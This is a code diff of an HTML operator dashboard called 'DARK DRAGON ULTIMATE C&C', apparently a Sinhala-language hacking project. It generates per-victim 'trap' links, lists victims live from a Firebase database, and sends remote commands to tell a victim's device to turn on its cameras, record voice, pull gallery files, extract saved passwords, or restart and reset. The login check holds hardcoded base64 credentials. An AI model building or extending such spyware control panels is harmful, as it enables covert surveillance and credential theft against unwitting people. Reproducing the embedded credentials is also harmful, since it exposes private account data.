@@ -2,27 +2,31 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | RED PROTOCOL TERMINAL v2.6</title>
+    <title>DARK DRAGON | ULTIMATE C&C v3.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon-red: #ff0000; --dark-red: #440000; --bg: #050000; }
+        :root { --neon-red: #ff0000; --dark-red: #440000; --bg: #050000; --cyan: #00ffff; --gold: #ffd700; }
         body { background: var(--bg); color: var(--neon-red); font-family: 'Courier New', monospace; margin: 0; overflow-x: hidden; }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
         #login-box { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border: 2px solid var(--neon-red); padding: 40px; text-align: center; background: black; z-index: 10000; box-shadow: 0 0 30px var(--dark-red); }
         input { background: #110000; border: 1px solid var(--neon-red); color: var(--neon-red); padding: 12px; margin: 10px 0; width: 280px; outline: none; }
-        button { background: var(--neon-red); color: #000; border: none; padding: 10px 30px; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        button { background: var(--neon-red); color: #000; border: none; padding: 10px 15px; font-weight: bold; cursor: pointer; margin: 5px; font-size: 10px; border-radius: 3px; }
+        button:hover { background: white; }
         #dashboard { display: none; }
-        header { border-bottom: 2px solid var(--neon-red); padding: 15px; text-align: center; background: #110000; }
+        header { border-bottom: 2px solid var(--neon-red); padding: 10px; text-align: center; background: #110000; }
         .tabs { display: flex; flex-wrap: wrap; background: #0a0000; border-bottom: 1px solid var(--neon-red); }
-        .tab { padding: 12px 10px; cursor: pointer; border-right: 1px solid var(--dark-red); flex: 1; text-align: center; font-size: 11px; }
-        .tab.active { background: var(--neon-red); color: #000; }
-        .container { padding: 20px; }
-        .panel { display: none; border: 1px solid var(--dark-red); padding: 20px; background: rgba(20, 0, 0, 0.7); min-height: 450px; }
+        .tab { padding: 10px 5px; cursor: pointer; border-right: 1px solid var(--dark-red); flex: 1; text-align: center; font-size: 10px; }
+        .tab.active { background: var(--neon-red); color: #000; font-weight: bold; }
+        .container { padding: 15px; }
+        .panel { display: none; border: 1px solid var(--dark-red); padding: 20px; background: rgba(15, 0, 0, 0.9); min-height: 500px; }
         .panel.active { display: block; }
-        .data-card { border-left: 4px solid var(--neon-red); background: rgba(21, 0, 0, 0.9); padding: 15px; margin-bottom: 15px; font-size: 13px; }
+        .data-card { border: 1px solid var(--dark-red); background: #000; padding: 15px; margin-bottom: 15px; position: relative; }
         table { width: 100%; border-collapse: collapse; font-size: 11px; }
         th, td { border: 1px solid var(--dark-red); padding: 8px; text-align: left; }
+        .live-window { width: 100%; height: 250px; background: #000; border: 1px solid var(--neon-red); display: flex; align-items: center; justify-content: center; color: var(--neon-red); overflow: hidden; }
+        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 10px; }
+        .file-item { border: 1px solid var(--dark-red); padding: 5px; text-align: center; font-size: 9px; }
     </style>
 </head>
 <body>
@@ -30,131 +34,130 @@
 <canvas id="matrixCanvas"></canvas>
 
 <div id="login-box">
-    <h1>DRAGON SYSTEM LOCK</h1>
+    <h1>DRAGON SYSTEM ACCESS</h1>
     <input type="email" id="admin-email" placeholder="ADMIN EMAIL">
     <input type="password" id="admin-password" placeholder="MASTER CODE">
     <button onclick="checkAccess()">AUTH & UNLOCK</button>
 </div>
 
 <div id="dashboard">
-    <header>
-        <h2>[ DARK DRAGON - COMMAND & CONTROL ]</h2>
-    </header>
+    <header><h3>DRAGON REMOTE COMMAND INTERFACE</h3></header>
 
     <div class="tabs">
         <div class="tab active" onclick="showTab(event, 'radar')">🛰️ RADAR</div>
-        <div class="tab" onclick="showTab(event, 'cat-injector')">🐈 CAT INJECTOR</div>
+        <div class="tab" onclick="showTab(event, 'cat-injector')">🐈 TRAP</div>
         <div class="tab" onclick="showTab(event, 'victims')">👥 VICTIMS</div>
-        <div class="tab" onclick="showTab(event, 'device')">📱 DEVICE</div>
-        <div class="tab" onclick="showTab(event, 'intel')">🔍 INTEL</div>
-        <div class="tab" onclick="showTab(event, 'ghost')">🛡️ GHOST</div>
+        <div class="tab" onclick="showTab(event, 'camera')">📸 CAM</div>
+        <div class="tab" onclick="showTab(event, 'voice')">🎤 VOICE</div>
+        <div class="tab" onclick="showTab(event, 'gallery')">🖼️ GALLERY</div>
+        <div class="tab" onclick="showTab(event, 'passwords')">🔑 PASS</div>
+        <div class="tab" onclick="showTab(event, 'control')">📱 CONTROL</div>
     </div>
 
     <div class="container">
+        <div id="radar" class="panel active"><h2>SCANNING NODES...</h2></div>
+
         <div id="cat-injector" class="panel">
-            <h2>SILENT CAT TRAP GENERATOR</h2>
-            <div class="data-card">
-                <input type="text" id="target-id-input" placeholder="Victim Name (e.g. Ruwan)">
-                <button onclick="generateCatLink()">GENERATE TRAP LINK</button>
-                <p id="link-result" style="color:cyan; margin-top:10px; word-break:break-all; font-weight: bold;"></p>
-            </div>
+            <h2>GENERATE SILENT TRAP</h2>
+            <input type="text" id="target-id-input" placeholder="Victim Name">
+            <button onclick="generateCatLink()">GENERATE</button>
+            <p id="link-result" style="color:var(--cyan);"></p>
         </div>
 
         <div id="victims" class="panel">
-            <h2>LIVE VICTIM LOGS</h2>
-            <div class="data-card">
-                <table>
-                    <thead><tr><th>Name</th><th>Device</th><th>Time</th><th>IP/Info</th></tr></thead>
-                    <tbody id="victim-list"></tbody>
-                </table>
-            </div>
+            <h2>LIVE LOGS</h2>
+            <table>
+                <thead><tr><th>Name</th><th>Device</th><th>Time</th><th>Action</th></tr></thead>
+                <tbody id="victim-list"></tbody>
+            </table>
         </div>
-        
-        <div id="radar" class="panel active"><h2>RADAR ACTIVE</h2><p>Scanning for incoming signals...</p></div>
-        <div id="device" class="panel"><h2>DEVICE EXPLOIT</h2><p>Select a victim to start exploit.</p></div>
-        <div id="intel" class="panel"><h2>ACTIVITY LOGS</h2><p>Waiting for data logs...</p></div>
-        <div id="ghost" class="panel"><h2>GHOST PROTOCOL</h2><p>Emergency stealth mode ready.</p></div>
+
+        <div id="camera" class="panel">
+            <h2>LIVE CAMERA VIEWER</h2>
+            <div class="live-window" id="cam-viewer">[ NO FEED ]</div>
+            <button onclick="sendCommand('cam_front')">FRONT CAM</button>
+            <button onclick="sendCommand('cam_back')">BACK CAM</button>
+        </div>
+
+        <div id="voice" class="panel">
+            <h2>VOICE RECORDER LOGS</h2>
+            <div class="data-card" id="voice-logs">No recordings yet.</div>
+            <button onclick="sendCommand('start_record')">START RECORDING</button>
+        </div>
+
+        <div id="gallery" class="panel">
+            <h2>GALLERY FILE ACCESS</h2>
+            <div class="file-grid" id="gallery-files">
+                </div>
+            <button onclick="sendCommand('fetch_gallery')">REFRESH FILES</button>
+        </div>
+
+        <div id="passwords" class="panel">
+            <h2>SAVED DATA & PASSWORDS</h2>
+            <div class="data-card" id="pass-list" style="color:var(--gold);">Waiting for extraction...</div>
+            <button onclick="sendCommand('get_passwords')">EXTRACT ALL</button>
+        </div>
+
+        <div id="control" class="panel">
+            <h2>REMOTE SYSTEM CONTROL</h2>
+            <button onclick="sendCommand('restart')">RESTART</button>
+            <button onclick="sendCommand('shutdown')">OFF</button>
+            <button onclick="sendCommand('reset')">RESET</button>
+        </div>
     </div>
 </div>
 
 <script>
-    // --- FIREBASE CONFIGURATION ---
-    const firebaseConfig = { 
-        databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" 
-    };
+    const firebaseConfig = { databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Login logic
     const _0x4d1a = "a2F2aWFraXlhQGdtYWlsLmNvbQ==";
     const _0x2b5s = "QWtpbmR1QERld3NoYW4yMDI0MTExOA==";
 
     function checkAccess() {
-        const u = document.getElementById('admin-email').value;
-        const p = document.getElementById('admin-password').value;
-        if(btoa(u) === _0x4d1a && btoa(p) === _0x2b5s) {
+        if(btoa(document.getElementById('admin-email').value) === _0x4d1a && btoa(document.getElementById('admin-password').value) === _0x2b5s) {
             document.getElementById('login-box').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
-            loadVictims(); // ලොග් වුණ ගමන් දත්ත කියවනවා
-        } else {
-            alert("ACCESS DENIED");
+            loadVictims();
         }
     }
 
-    // ලින්ක් එක හදන එක (index.html එක Github Pages වල තියෙද්දි මේක වැඩ)
     function generateCatLink() {
         const target = document.getElementById('target-id-input').value;
-        if(!target) { alert("Name එකක් ගහපන්!"); return; }
-        const currentUrl = window.location.href;
-        const baseURL = currentUrl.substring(0, currentUrl.lastIndexOf("/") + 1);
-        const finalLink = baseURL + "cat_trap.html?t=" + btoa(target);
-        document.getElementById('link-result').innerText = finalLink;
+        const baseURL = window.location.href.substring(0, window.location.href.lastIndexOf("/") + 1);
+        document.getElementById('link-result').innerText = baseURL + "cat_trap.html?t=" + btoa(target);
     }
 
-    // Database එකෙන් දත්ත ලයිව් කියවීම
     function loadVictims() {
-        db.ref('victims').on('value', (snapshot) => {
+        db.ref('victims').on('value', (snap) => {
             const list = document.getElementById('victim-list');
             list.innerHTML = "";
-            snapshot.forEach((child) => {
+            snap.forEach((child) => {
                 const val = child.val();
-                list.innerHTML += `<tr>
-                    <td>${val.target || 'N/A'}</td>
-                    <td>${val.device || 'N/A'}</td>
-                    <td style="color:#ff5555">${val.time || '--'}</td>
-                    <td>${val.agent ? val.agent.substring(0,25) + '...' : '--'}</td>
-                </tr>`;
+                list.innerHTML += `<tr><td>${val.target}</td><td>${val.device}</td><td>${val.time}</td>
+                <td><button onclick="selectTarget('${child.key}')">SELECT</button></td></tr>`;
             });
         });
+    }
+
+    function selectTarget(key) {
+        window.activeTarget = key;
+        alert("Target Locked!");
+    }
+
+    function sendCommand(cmd) {
+        if(!window.activeTarget) return alert("Select Victim First!");
+        db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
+        alert("Sent: " + cmd);
     }
 
     function showTab(evt, id) {
         document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
         document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        evt.currentTarget.classList.add('active');
+        if(evt) evt.currentTarget.classList.add('active');
     }
-
-    // Matrix Rain Effect
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-    const alphabet = "01";
-    const fontSize = 16;
-    const columns = canvas.width / fontSize;
-    const rainDrops = Array(Math.floor(columns)).fill(1);
-
-    function drawMatrix() {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = '#ff0000'; ctx.font = fontSize + 'px monospace';
-        for(let i = 0; i < rainDrops.length; i++) {
-            const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-            ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
-            if(rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
-            rainDrops[i]++;
-        }
-    }
-    setInterval(drawMatrix, 50);
 </script>
 </body>
 </html>
